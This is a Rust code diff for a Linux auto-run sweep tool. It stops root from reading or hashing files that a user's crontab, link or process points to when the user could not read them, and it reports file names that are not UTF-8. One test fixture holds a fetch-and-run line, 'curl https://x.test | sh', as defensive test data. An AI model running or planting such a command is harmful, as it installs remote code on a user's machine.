@@ -6,11 +6,12 @@
 use std::collections::{BTreeMap, HashSet};
 use std::fs;
 use std::io;
+use std::os::unix::fs::MetadataExt;
 use std::path::Path;
 
 use super::commands;
 use super::index::PackageIndex;
-use super::read::{self, Found};
+use super::read::{self, Found, View};
 use super::tier::{Observed, Tier, classify};
 use crate::autorun::{Category, Kind, Location, SYSTEM, SYSTEM_SWEEP, USER};
 use crate::content::{self, Content};
@@ -43,6 +44,13 @@ const WATCHED_NAMES: &[&str] = &[
 /// Where Omarchy's installer lives; paths it mentions are noted as "likely
 /// Omarchy" when no package owns them.
 const OMARCHY_INSTALL: &[&str] = &["usr/share/omarchy/install", "usr/share/omarchy/migrations"];
+
+/// Why root did not look at a path a user could have chosen.
+pub const NOT_LOOKED_AT: &str =
+    "only root can read it, and a user's file or process names it: not looked at";
+
+/// Why root did not look at a path nobody chose.
+const NOT_REACHED: &str = "gone, or behind a link that is not root's alone: not looked at";
 
 /// The format label of a file root hashed but did not hand back.
 pub const WITHHELD: &str = "root-only file (hashed, content withheld)";
@@ -104,7 +112,8 @@ impl Item {
 #[derive(Debug, Default)]
 pub struct Collection {
     pub items: Vec<Item>,
-    /// Locations with more entries than were looked at.
+    /// What was not looked at, each as a sentence: a location with more
+    /// entries than the limit, a name that cannot be read.
     pub truncated: Vec<String>,
 }
 
@@ -207,8 +216,9 @@ fn add_location(
     } else {
         let listing = read::entries(scope.root, &base);
         if listing.truncated {
-            truncated.push(format!("/{base}"));
+            truncated.push(format!("/{base}: more entries than were looked at"));
         }
+        truncated.extend(listing.unnamed.iter().map(|name| not_utf8(name)));
         // A directory only root can list is one unreadable item.
         for directory in listing.unreadable {
             paths.entry(directory).or_insert(location.category);
@@ -221,6 +231,143 @@ fn add_location(
             paths.entry(path).or_insert(location.category);
         }
     }
+}
+
+/// The sentence for an entry whose name the sweep cannot read.
+pub fn not_utf8(shown: &str) -> String {
+    // A name may hold a newline, which would start a line of its own.
+    format!("/{}{NOT_UTF8}", shown.escape_debug())
+}
+
+const NOT_UTF8: &str = ": a name that is not UTF-8 was not checked";
+
+/// The most sentences of what was not looked at that are kept.
+const MAX_UNCHECKED: usize = 20;
+
+/// `unchecked` without repeats and within a bound, the rest counted.
+pub fn bounded(mut unchecked: Vec<String>) -> Vec<String> {
+    // Names last: anyone can make many, and they must not crowd out a
+    // limit that was reached.
+    unchecked.sort_by_key(|sentence| (sentence.ends_with(NOT_UTF8), sentence.clone()));
+    unchecked.dedup();
+    let more = unchecked.len().saturating_sub(MAX_UNCHECKED);
+    unchecked.truncate(MAX_UNCHECKED);
+    if more > 0 {
+        unchecked.push(format!("and {more} more that were not checked"));
+    }
+    unchecked
+}
+
+/// Whether a user decides what `run_by` names: it is not a file that is
+/// root's alone to write. What a live check reached (no `run_by`) comes
+/// from a process, which any user can start with the arguments and
+/// environment they like.
+fn user_steered(root: &Path, run_by: Option<&str>) -> bool {
+    run_by.is_none_or(|by| {
+        // A spool holds what users handed in (their crontabs), whoever
+        // the files belong to.
+        if by.starts_with("var/spool/") {
+            return true;
+        }
+        // Root's own file in a directory somebody else may write can be
+        // exchanged for theirs between two looks: it counts only where the
+        // whole way to it is root's alone.
+        let Some(read::Seen {
+            what: read::Public::File(file),
+            kept: true,
+            ..
+        }) = read::seen(root, by, View::Pinned)
+        else {
+            return true;
+        };
+        !file
+            .metadata()
+            .is_ok_and(|metadata| metadata.uid() == 0 && metadata.mode() & 0o022 == 0)
+    })
+}
+
+/// How root looks at what `run_by` (or, without one, a process) names
+/// (`None`: not root, who sees no more through a path than its user does
+/// anyway). A path a user can choose (a line of their crontab, where a
+/// link leads, an `LD_PRELOAD` value, a script argument) is looked at as
+/// the user could look at it: otherwise its hash, its kind, where a link
+/// leads and whether it exists at all would tell them about a file they
+/// cannot read. And root never goes by the path alone: a user who owns a
+/// directory on the way can swap it for a link elsewhere at any moment.
+fn view(scope: &Scope<'_>, run_by: Option<&str>) -> Option<View> {
+    (scope.origin == Origin::Root).then(|| {
+        if user_steered(scope.root, run_by) {
+            View::Everyone
+        } else {
+            View::Trusted
+        }
+    })
+}
+
+/// Whether there is something at `path` that `run_by` may lead the
+/// collector to.
+pub fn is_there(scope: &Scope<'_>, path: &str, run_by: Option<&str>) -> bool {
+    match view(scope, run_by) {
+        Some(view) => read::seen(scope.root, path, view).is_some(),
+        None => fs::symlink_metadata(scope.root.join(path)).is_ok(),
+    }
+}
+
+/// Whether there is a regular file at `path` that `run_by` may lead the
+/// collector to (a link to one counts, as for `Path::is_file`, unless root
+/// looks).
+pub fn is_file_there(scope: &Scope<'_>, path: &str, run_by: Option<&str>) -> bool {
+    match view(scope, run_by) {
+        Some(view) => matches!(
+            read::seen(scope.root, path, view).map(|seen| seen.what),
+            Some(read::Public::File(_))
+        ),
+        None => scope.root.join(path).is_file(),
+    }
+}
+
+/// How the collector sees the hops of a link chain. As root, a link leads
+/// where its owner says, so every hop is seen as everyone sees it.
+fn hop(scope: &Scope<'_>, path: &str) -> read::Hop {
+    if scope.origin == Origin::Root {
+        read::public_hop(scope.root, path)
+    } else {
+        read::plain_hop(scope.root, path)
+    }
+}
+
+/// `read::look` at where a link led.
+fn look_past_link(scope: &Scope<'_>, path: &str) -> Found {
+    if scope.origin == Origin::Root {
+        read::look_as(scope.root, path, View::Everyone)
+            .unwrap_or_else(|| Found::Unreadable(NOT_LOOKED_AT.into()))
+    } else {
+        read::look(scope.root, path)
+    }
+}
+
+/// `read::look` at an item. What a process names (a script argument, an
+/// `LD_PRELOAD` value) or a file led to is seen as `view` has it; the
+/// auto-run locations' own files, and the set-id and kernel-module checks'
+/// (which find their files themselves, so nobody chose those), as root
+/// sees them.
+pub fn look(scope: &Scope<'_>, category: Category, path: &str, run_by: Option<&str>) -> Found {
+    if scope.origin != Origin::Root {
+        return read::look(scope.root, path);
+    }
+    let named = run_by.is_some()
+        || matches!(
+            category,
+            Category::Process | Category::Listener | Category::Input | Category::Camera
+        );
+    let (view, unseen) = if named && user_steered(scope.root, run_by) {
+        (View::Everyone, NOT_LOOKED_AT)
+    } else if named {
+        (View::Trusted, NOT_LOOKED_AT)
+    } else {
+        (View::Pinned, NOT_REACHED)
+    };
+    read::look_as(scope.root, path, view).unwrap_or_else(|| Found::Unreadable(unseen.into()))
 }
 
 /// Whether a file in a user location is one that runs on its own.
@@ -259,8 +406,19 @@ fn wanted(scope: &Scope<'_>, category: Category, relative: &str) -> bool {
 
 /// One item: what is at `path`, its tier and content, and what it runs.
 pub fn item(scope: &Scope<'_>, category: Category, path: String, run_by: Option<&str>) -> Item {
-    let found = read::look(scope.root, &path);
-    let (tier, sha256, body) = match &found {
+    let found = look(scope, category, &path, run_by);
+    item_of(scope, category, path, run_by, &found)
+}
+
+/// The item for what `look` found at `path`.
+pub fn item_of(
+    scope: &Scope<'_>,
+    category: Category,
+    path: String,
+    run_by: Option<&str>,
+    found: &Found,
+) -> Item {
+    let (tier, sha256, body) = match found {
         Found::File {
             sha256,
             mode,
@@ -279,7 +437,7 @@ pub fn item(scope: &Scope<'_>, category: Category, path: String, run_by: Option<
             )
         }
         Found::Link(target) => {
-            let resolved_path = read::resolve(scope.root, &path, target);
+            let resolved_path = read::resolve_where(&path, target, &|next| hop(scope, next));
             let resolved = resolved_path
                 .as_deref()
                 .and_then(|resolved| self_tier(scope, resolved));
@@ -289,7 +447,7 @@ pub fn item(scope: &Scope<'_>, category: Category, path: String, run_by: Option<
                 resolved,
                 alias: resolved_path
                     .as_deref()
-                    .is_some_and(|resolved| declares_alias(scope.root, resolved, name)),
+                    .is_some_and(|resolved| declares_alias(scope, resolved, name)),
             };
             (
                 classify(&path, observed, scope.index),
@@ -298,8 +456,10 @@ pub fn item(scope: &Scope<'_>, category: Category, path: String, run_by: Option<
             )
         }
         Found::Other => {
-            let directory = fs::symlink_metadata(scope.root.join(&path))
-                .is_ok_and(|metadata| metadata.is_dir());
+            // Root can list any directory.
+            let directory = scope.origin != Origin::Root
+                && fs::symlink_metadata(scope.root.join(&path))
+                    .is_ok_and(|metadata| metadata.is_dir());
             let reason = if directory {
                 "a directory only root can list"
             } else {
@@ -393,8 +553,8 @@ fn notes(
 
 /// Whether the unit at `unit` declares `name` as an alias (`Alias=` in its
 /// `[Install]` section), as `systemctl enable` links it under.
-fn declares_alias(root: &Path, unit: &str, name: &str) -> bool {
-    let Found::File { head, size, .. } = read::look(root, unit) else {
+fn declares_alias(scope: &Scope<'_>, unit: &str, name: &str) -> bool {
+    let Found::File { head, size, .. } = look_past_link(scope, unit) else {
         return false;
     };
     if size > 64 * 1024 {
@@ -409,7 +569,7 @@ fn declares_alias(root: &Path, unit: &str, name: &str) -> bool {
 
 /// The tier of the regular file at `path`, if it is one.
 fn self_tier(scope: &Scope<'_>, path: &str) -> Option<Tier> {
-    match read::look(scope.root, path) {
+    match look_past_link(scope, path) {
         Found::File {
             sha256, mode, size, ..
         } => Some(classify(
@@ -446,9 +606,10 @@ fn follow(scope: &Scope<'_>, item: &Item) -> Vec<String> {
     let mut targets = Vec::new();
     // Only a link to a regular file leads anywhere to judge (a masked
     // unit's `/dev/null` does not).
+    let by = Some(item.path.as_str());
     if let Body::Link(target) = &item.body
-        && let Some(resolved) = read::resolve(scope.root, &item.path, target)
-        && fs::symlink_metadata(scope.root.join(&resolved)).is_ok_and(|metadata| metadata.is_file())
+        && let Some(resolved) = read::resolve_where(&item.path, target, &|next| hop(scope, next))
+        && matches!(look_past_link(scope, &resolved), Found::File { .. })
     {
         targets.push(resolved);
     }
@@ -459,11 +620,18 @@ fn follow(scope: &Scope<'_>, item: &Item) -> Vec<String> {
         .and_then(|user| user_home(scope.root, user));
     let home = crontab_home.as_deref().or(scope.home).unwrap_or("root");
     for command in &item.runs {
-        targets.extend(commands::targets(scope.root, home, command));
+        targets.extend(commands::targets_where(home, command, &|candidate| {
+            is_there(scope, candidate, by)
+        }));
     }
+    let view = view(scope, by);
     targets
         .into_iter()
-        .filter_map(|target| read::canonical(scope.root, &target))
+        .filter_map(|target| match view {
+            // The path the pinned walk took, not one resolved again.
+            Some(view) => read::seen(scope.root, &target, view).map(|seen| seen.path),
+            None => read::canonical(scope.root, &target),
+        })
         .collect()
 }
 
@@ -618,6 +786,181 @@ mod tests {
         assert_eq!(script.category, Category::Udev);
         assert!(matches!(&script.body, Body::Text(text) if text.contains("curl")));
         assert_eq!(collection.items[4].runs, ["waybar"]);
+    }
+
+    #[test]
+    fn a_name_that_is_not_utf8_is_said_not_skipped() {
+        use std::ffi::OsStr;
+        use std::os::unix::ffi::OsStrExt;
+        let dir = TempDir::new("sweep-unnamed");
+        let root = dir.path();
+        write(root, "etc/profile.d/fine.sh", "true\n");
+        fs::write(
+            root.join("etc/profile.d")
+                .join(OsStr::from_bytes(b"evil\xff.sh")),
+            "curl https://x.test | sh\n",
+        )
+        .unwrap();
+        fs::create_dir(
+            root.join("etc/profile.d")
+                .join(OsStr::from_bytes(b"dir\xff")),
+        )
+        .unwrap();
+        let index = PackageIndex::with_foreign(HashSet::new());
+        let collection = collect(&Scope {
+            root,
+            home: None,
+            index: &index,
+            origin: Origin::System,
+        });
+        assert!(
+            collection
+                .items
+                .iter()
+                .any(|item| item.path == "etc/profile.d/fine.sh")
+        );
+        assert_eq!(
+            collection.truncated,
+            [
+                "/etc/profile.d/dir\u{fffd}: a name that is not UTF-8 was not checked",
+                "/etc/profile.d/evil\u{fffd}.sh: a name that is not UTF-8 was not checked",
+            ]
+        );
+        // A newline in a name stays on its line, and a long list is counted.
+        assert_eq!(
+            super::not_utf8("etc/x\n! forged"),
+            "/etc/x\\n! forged: a name that is not UTF-8 was not checked"
+        );
+        let many: Vec<String> = (0..30)
+            .map(|n| format!("/d{n:02}: x"))
+            .chain(["/d00: x".into()])
+            .collect();
+        let kept = super::bounded(many);
+        assert_eq!(kept.len(), 21);
+        assert_eq!(kept[0], "/d00: x");
+        assert_eq!(kept[20], "and 10 more that were not checked");
+        // A limit that was reached comes before any number of names.
+        let names: Vec<String> = (0..30)
+            .map(|n| super::not_utf8(&format!("a/{n:02}")))
+            .chain(["more than 5 files: not looked for everywhere".to_string()])
+            .collect();
+        assert_eq!(
+            super::bounded(names)[0],
+            "more than 5 files: not looked for everywhere"
+        );
+    }
+
+    #[test]
+    fn root_only_looks_where_a_user_points_if_the_user_could_too() {
+        use std::os::unix::fs::{MetadataExt, PermissionsExt};
+        let dir = TempDir::new("sweep-steered");
+        let root = dir.path();
+        // Run as root (a container), every file here is root's own, which
+        // nobody else steers: there is no user to play.
+        if fs::metadata(root).unwrap().uid() == 0 {
+            return;
+        }
+        write(root, "var/spool/cron/u", "* * * * * /etc/secret\n");
+        write(root, "etc/secret", "pin 1234\n");
+        write(root, "etc/open", "public\n");
+        write(root, "root/private/key", "key\n");
+        symlink("/etc/secret", root.join("etc/link")).unwrap();
+        let mode = |path: &str, mode: u32| {
+            fs::set_permissions(root.join(path), fs::Permissions::from_mode(mode)).unwrap();
+        };
+        mode("etc/secret", 0o600);
+        mode("root/private", 0o700);
+        let index = PackageIndex::with_foreign(HashSet::new());
+        let scope = |origin| Scope {
+            root,
+            home: Some("root"),
+            index: &index,
+            origin,
+        };
+        let by = Some("var/spool/cron/u");
+        let as_root = scope(Origin::Root);
+        // What the crontab line leads to is not even looked for.
+        let crontab = super::item(&as_root, Category::Cron, "var/spool/cron/u".into(), None);
+        assert_eq!(crontab.runs, ["/etc/secret"]);
+        assert!(super::follow(&as_root, &crontab).is_empty());
+        write(root, "var/spool/cron/v", "* * * * * /etc/open\n");
+        let open_crontab = super::item(&as_root, Category::Cron, "var/spool/cron/v".into(), None);
+        assert_eq!(super::follow(&as_root, &open_crontab), ["etc/open"]);
+        // Nor where a user's link leads, directly or through a link only
+        // root can see.
+        let user_link = super::item(&as_root, Category::Cron, "etc/link".into(), by);
+        assert!(super::follow(&as_root, &user_link).is_empty());
+        symlink("/etc/open", root.join("root/private/hop")).unwrap();
+        symlink("/root/private/hop", root.join("etc/chain")).unwrap();
+        let chain = super::item(&as_root, Category::Cron, "etc/chain".into(), by);
+        assert_eq!(chain.body, Body::Link("/root/private/hop".into()));
+        assert!(super::follow(&as_root, &chain).is_empty());
+        assert_eq!(super::follow(&scope(Origin::System), &chain), ["etc/open"]);
+        // The user's own sweep follows both.
+        let as_user = scope(Origin::System);
+        assert_eq!(super::follow(&as_user, &crontab), ["etc/secret"]);
+
+        // Named by a user's crontab: what only root can read is not looked
+        // at, and one that is not there looks the same.
+        for path in ["etc/secret", "root/private/key", "etc/missing"] {
+            let found = super::item(&as_root, Category::Cron, path.into(), by);
+            assert_eq!(
+                found.body,
+                Body::Unreadable(super::NOT_LOOKED_AT.into()),
+                "{path}"
+            );
+            assert_eq!(found.sha256, None, "{path}");
+        }
+        // The same for what a process names (a live check).
+        let live = super::item(&as_root, Category::Process, "etc/secret".into(), None);
+        assert_eq!(live.body, Body::Unreadable(super::NOT_LOOKED_AT.into()));
+        // What everyone may read is hashed as before, and a link says
+        // where it leads.
+        let open = super::item(&as_root, Category::Cron, "etc/open".into(), by);
+        assert_eq!(open.body, Body::Binary(super::WITHHELD));
+        assert!(open.sha256.is_some());
+        let link = super::item(&as_root, Category::Cron, "etc/link".into(), by);
+        assert_eq!(link.body, Body::Link("/etc/secret".into()));
+        // An auto-run location's own file, and the user's own sweep, are
+        // not affected.
+        let direct = super::item(&as_root, Category::Cron, "etc/secret".into(), None);
+        assert!(matches!(direct.body, Body::Text(_)));
+        let own = super::item(
+            &scope(Origin::System),
+            Category::Cron,
+            "etc/secret".into(),
+            by,
+        );
+        assert!(matches!(own.body, Body::Text(_)));
+
+        assert!(super::is_there(&as_root, "etc/open", by));
+        assert!(!super::is_there(&as_root, "etc/secret", by));
+        // A link is not the file it leads to, in the guarded view.
+        symlink("open", root.join("etc/beside")).unwrap();
+        assert!(!super::is_file_there(&as_root, "etc/beside", None));
+        assert!(super::is_file_there(
+            &scope(Origin::System),
+            "etc/beside",
+            None
+        ));
+        assert!(super::is_file_there(&as_root, "etc/open", None));
+        // A command through a link on the way: followed where nobody else
+        // could have put the link, and told by the path really taken.
+        symlink("etc", root.join("conf")).unwrap();
+        fs::create_dir_all(root.join("tmp")).unwrap();
+        symlink("../etc", root.join("tmp/conf")).unwrap();
+        mode("tmp", 0o777);
+        write(
+            root,
+            "var/spool/cron/w",
+            "* * * * * /conf/open\n* * * * * /tmp/conf/open\n",
+        );
+        let through = super::item(&as_root, Category::Cron, "var/spool/cron/w".into(), None);
+        assert_eq!(super::follow(&as_root, &through), ["etc/open"]);
+        assert!(!super::is_there(&as_root, "tmp/conf/open", by));
+        assert!(super::user_steered(root, None));
+        // Not root's file: whoever owns it decides what it names.
+        assert!(super::user_steered(root, by));
     }
 
     #[test]
